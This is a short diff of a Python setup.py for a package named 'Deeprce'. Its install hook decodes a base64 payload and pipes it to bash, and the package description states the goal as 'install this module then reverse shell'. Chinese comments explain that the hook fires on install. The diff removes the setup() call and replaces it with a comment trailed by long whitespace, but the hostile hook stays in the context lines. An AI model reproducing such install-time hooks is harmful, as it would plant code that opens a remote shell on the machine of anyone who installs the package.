@@ -15,12 +15,5 @@ class CustomInstall(install):
      os.system('echo %s|base64 -d|bash' % encoded.decode())
 
 
-setup(name='Deeprce', # 库的名字
- version='0.0.1', # 版本
- description="install this module then reverse shell", # 描述
- author="dpm", # 作者
- py_module=["deepmountains.hello"], # 这里通过手动指定的方式，指定需要打包的模块
- cmdclass={'install': CustomInstall}
- # cmdclass：当执行python3 setup install的时候触发CustomInstall类的执行
- )
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                      
 
